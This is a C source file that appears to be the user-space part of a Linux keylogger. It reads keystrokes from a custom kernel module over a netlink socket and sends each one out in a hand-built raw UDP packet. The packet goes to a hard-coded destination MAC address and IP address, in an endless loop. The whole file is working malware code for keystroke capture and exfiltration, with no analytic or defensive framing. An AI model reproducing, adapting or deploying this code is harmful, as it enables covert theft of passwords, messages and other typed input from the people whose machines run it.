
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/socket.h>
#include <errno.h>
#include "send_packet_raw_subodh.h"

#define PORT 30		  // same customized protocol as in my kernel module
#define MAX_PAYLOAD 3 // maximum payload size

struct sockaddr_nl src_addr, dest_addr;
struct nlmsghdr *nlh = NULL;
struct nlmsghdr *nlh2 = NULL;
struct msghdr msg, resp; // famous struct msghdr, it includes "struct iovec *   msg_iov;"
struct iovec iov, iov2;
int sock_fd;

void get_eth_index()
{
	memset(&ifreq_i, 0, sizeof(ifreq_i));
	strncpy(ifreq_i.ifr_name, "wlp2s0", IFNAMSIZ - 1);

	if ((ioctl(sock_raw, SIOCGIFINDEX, &ifreq_i)) < 0)
		printf("error in index ioctl reading");

	printf("index=%d\n", ifreq_i.ifr_ifindex);
}

void get_mac()
{
	memset(&ifreq_c, 0, sizeof(ifreq_c));
	strncpy(ifreq_c.ifr_name, "wlp2s0", IFNAMSIZ - 1);
	//! SIOCGIFHWADDR - get the sender (my) mac adress
	if ((ioctl(sock_raw, SIOCGIFHWADDR, &ifreq_c)) < 0)
		printf("error in SIOCGIFHWADDR ioctl reading");

	printf("Mac= %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[0]), (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[1]), (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[2]), (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[3]), (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[4]), (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[5]));

	printf("ethernet packaging start ... \n");
	//! create the ethernet header part of the packet - fill the sorce and the dest with the appropriate adresses :
	//! DESTMAC0-5 - the destination MAC address
	//! ifreq_c.ifr_hwaddr.sa_data[0-5] - my mac adress
	struct ethhdr *eth = (struct ethhdr *)(sendbuff);
	eth->h_source[0] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[0]);
	eth->h_source[1] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[1]);
	eth->h_source[2] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[2]);
	eth->h_source[3] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[3]);
	eth->h_source[4] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[4]);
	eth->h_source[5] = (unsigned char)(ifreq_c.ifr_hwaddr.sa_data[5]);

	eth->h_dest[0] = DESTMAC0;
	eth->h_dest[1] = DESTMAC1;
	eth->h_dest[2] = DESTMAC2;
	eth->h_dest[3] = DESTMAC3;
	eth->h_dest[4] = DESTMAC4;
	eth->h_dest[5] = DESTMAC5;

	eth->h_proto = htons(ETH_P_IP); // 0x800
	//! eth->h_proto - the incapsulated protocol. 0x800 = 2048 = ipv4 ID

	printf("ethernet packaging done.\n");

	total_len += sizeof(struct ethhdr);
}

inline void set_data(char tav)
{
	sendbuff[total_len] = tav;
	sendbuff[total_len + 1] = 0;
}	
void get_udp(char data)
{
	//!	set udh to the correct position in the buffer by offsetting the ip and ether headers.
	//! no options were added so theres no reason to use iph->ihl for correct ip header size.
	struct udphdr *uh = (struct udphdr *)(sendbuff + sizeof(struct iphdr) + sizeof(struct ethhdr));

	uh->source = htons(23451);
	uh->dest = htons(23452);
	uh->check = 0;

	//! update the total packet len
	total_len += sizeof(struct udphdr);
	set_data(data);
	uh->len = htons((total_len - sizeof(struct iphdr) - sizeof(struct ethhdr)));
}

unsigned short checksum(unsigned short *buff, int _16bitword)
{
	unsigned long sum;
	for (sum = 0; _16bitword > 0; _16bitword--)
		sum += htons(*(buff)++);
	do
	{
		sum = ((sum >> 16) + (sum & 0xFFFF));
	} while (sum & 0xFFFF0000);

	return (~sum);
}
void get_ip()
{
	memset(&ifreq_ip, 0, sizeof(ifreq_ip));
	strncpy(ifreq_ip.ifr_name, "wlp2s0", IFNAMSIZ - 1);
	//! get a valid ipv4 adress
	if (ioctl(sock_raw, SIOCGIFADDR, &ifreq_ip) < 0)
	{
		printf("error in SIOCGIFADDR \n");
	}

	printf("%s\n", inet_ntoa((((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr)));

	/****** OR
		int i;
		for(i=0;i<14;i++)
		printf("%d\n",(unsigned char)ifreq_ip.ifr_addr.sa_data[i]); ******/
	//! setup ip header in the buffer by offsetting the size of the ethernet header
	struct iphdr *iph = (struct iphdr *)(sendbuff + sizeof(struct ethhdr));
	//* size of iph header
	iph->ihl = 5;
	//! ipv4
	iph->version = 4;
	//! changed to 1, irrelevant
	iph->tos = 1;
	//! random number;
	iph->id = htons(10201);
	//! theoreticly could be set to 1 as the host is on the same network, but just to be safe the value is set higher
	iph->ttl = 64;
	//! udp protocol
	iph->protocol = 17;

	iph->saddr = inet_addr(inet_ntoa((((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr)));
	iph->daddr = inet_addr("destination_ip"); // put destination IP address
	//! update the packet len
	total_len += sizeof(struct iphdr);

	iph->tot_len = htons(total_len - sizeof(struct ethhdr));
	iph->check = htons(checksum((unsigned short *)(sendbuff + sizeof(struct ethhdr)), (sizeof(struct iphdr) / 2)));
}

void setup_sender()
{
	sock_raw = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (sock_raw == -1)
		printf("error in socket");

	sendbuff = (unsigned char *)malloc(64);
	memset(sendbuff, 0, 64);

	get_eth_index(); // interface number
	get_mac();
	get_ip();
	ready_to_send = 1;
}

void send_char(char tav)
{
	if (ready_to_send)
	{
		printf("!!!\n");
		get_udp(tav);
		struct sockaddr_ll sadr_ll;
		sadr_ll.sll_ifindex = ifreq_i.ifr_ifindex;
		sadr_ll.sll_halen = ETH_ALEN;
		sadr_ll.sll_addr[0] = DESTMAC0;
		sadr_ll.sll_addr[1] = DESTMAC1;
		sadr_ll.sll_addr[2] = DESTMAC2;
		sadr_ll.sll_addr[3] = DESTMAC3;
		sadr_ll.sll_addr[4] = DESTMAC4;
		sadr_ll.sll_addr[5] = DESTMAC5;

		printf("sending...\n");

		send_len = sendto(sock_raw, sendbuff, 64, 0, (const struct sockaddr *)&sadr_ll, sizeof(struct sockaddr_ll));
		if (send_len < 0)
		{
			printf("error in sending....sendlen=%d....errno=%d\n", send_len, errno);
		}
	}
	else
	{
		printf("call setup_sender first\n");
	}
}

int main(int args, char *argv[])
{
	// int socket(int domain, int type, int protocol);
	sock_fd = socket(PF_NETLINK, SOCK_RAW, PORT); // NETLINK_KOBJECT_UEVENT

	if (sock_fd < 0)
	{
		perror("cannot open socket");
		return -1;
	}
	memset(&src_addr, 0, sizeof(src_addr));
	src_addr.nl_family = AF_NETLINK;
	src_addr.nl_pid = getpid(); /* self pid */

	// int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	if (bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr)))
	{
		perror("bind() error\n");
		close(sock_fd);
		return -1;
	}

	memset(&dest_addr, 0, sizeof(dest_addr));
	dest_addr.nl_family = AF_NETLINK;
	dest_addr.nl_pid = 0;	 /* For Linux Kernel */
	dest_addr.nl_groups = 0; /* unicast */

	// nlh: contains "Hello" msg
	nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
	memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
	nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlh->nlmsg_pid = getpid(); // self pid
	nlh->nlmsg_flags = 0;

	// nlh2: contains received msg
	nlh2 = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
	memset(nlh2, 0, NLMSG_SPACE(MAX_PAYLOAD));
	nlh2->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlh2->nlmsg_pid = getpid(); // self pid
	nlh2->nlmsg_flags = 0;

	strncpy(NLMSG_DATA(nlh), "ok", 2); // put "Hello" msg into nlh

	iov.iov_base = (void *)nlh; // iov -> nlh
	iov.iov_len = nlh->nlmsg_len;
	msg.msg_name = (void *)&dest_addr; // msg_name is Socket name: dest
	msg.msg_namelen = sizeof(dest_addr);
	msg.msg_iov = &iov; // msg -> iov
	msg.msg_iovlen = 1;

	iov2.iov_base = (void *)nlh2; // iov -> nlh2
	iov2.iov_len = nlh2->nlmsg_len;
	resp.msg_name = (void *)&dest_addr; // msg_name is Socket name: dest
	resp.msg_namelen = sizeof(dest_addr);
	resp.msg_iov = &iov2; // resp -> iov
	resp.msg_iovlen = 1;
	int ret = sendmsg(sock_fd, &msg, 0);
	printf("Waiting for message from kernel\n");
	/* Read message from kernel */
	recvmsg(sock_fd, &resp, 0); // msg is also receiver for read
	printf("key stroke: %s\n", (char *)NLMSG_DATA(nlh2));
	setup_sender();
	send_char(*(char *)NLMSG_DATA(nlh2));

	while (1)
	{
		strncpy(NLMSG_DATA(nlh), "ok", 2);
		ret = sendmsg(sock_fd, &msg, 0);
		printf("Waiting for message from kernel\n");
		recvmsg(sock_fd, &resp, 0); // msg is also receiver for read
		if ((char *)NLMSG_DATA(nlh2))
		{
			send_char(*(char *)NLMSG_DATA(nlh2));
			total_len -= sizeof(struct udphdr);
		}
	}
	close(sock_fd);
	return 0;
}
